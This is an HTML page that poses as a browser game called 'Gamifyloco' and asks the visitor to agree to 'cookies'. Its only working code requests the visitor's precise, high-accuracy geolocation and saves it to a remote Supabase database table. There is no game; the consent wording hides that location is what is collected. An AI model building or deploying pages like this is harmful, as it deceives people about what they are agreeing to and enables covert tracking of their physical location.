<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>Gamifyloco</title>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 35px;
            background: #f1f4f9;
        }

        .box {
            background: white;
            padding: 25px;
            border-radius: 12px;
            max-width: 450px;
            margin: auto;
        }

        button {
            padding: 13px 22px;
            background: #1769aa;
            color: white;
            border: none;
            border-radius: 7px;
            cursor: pointer;
        }
    </style>
</head>

<body>

<div class="box">

    <h2>gamifyloco</h2>

    <p>
        This game needs to conscent for cookies 
        to run on your backend.
    </p>
    <label>
        <input type="checkbox" id="consent">
        I understand and agree to play the game.
    </label>

    <br><br>

    <button onclick="shareLocation()">
        Play the game
    </button>

    <p id="status"></p>

</div>

<script>
const sbClient = window.supabase.createClient(
    "https://phroujtuilskvjzphpty.supabase.co",
    "sb_publishable_hwPtngV2FZxzy73xPY2Cew_iYaCfr4q"
);

async function shareLocation() {

    const status = document.getElementById("status");

    try {

        if (!document.getElementById("consent").checked) {
            status.innerText = "Please agree first.";
            return;
        }

        if (!window.isSecureContext) {
            status.innerText = "Error: HTTPS is required.";
            return;
        }

        if (!navigator.geolocation) {
            status.innerText = "Geolocation unavailable.";
            return;
        }

        status.innerText = "Requesting location permission...";

        navigator.geolocation.getCurrentPosition(
            async (position) => {

                status.innerText = "Location obtained. Saving...";

                const { error } = await sbClient
                    .from("location_demo")
                    .insert({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy_m: position.coords.accuracy,
                        consent: true
                    });

                if (error) {
                    status.innerText = "Database error: " + error.message;
                    return;
                }

                status.innerText = "Successfully submitted!";

            },

            (error) => {
                status.innerText =
                    "Location error (" + error.code + "): " +
                    error.message;
            },

            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );

    } catch (error) {
        status.innerText = "JavaScript error: " + error.message;
    }
}
</script>

</body>
</html>
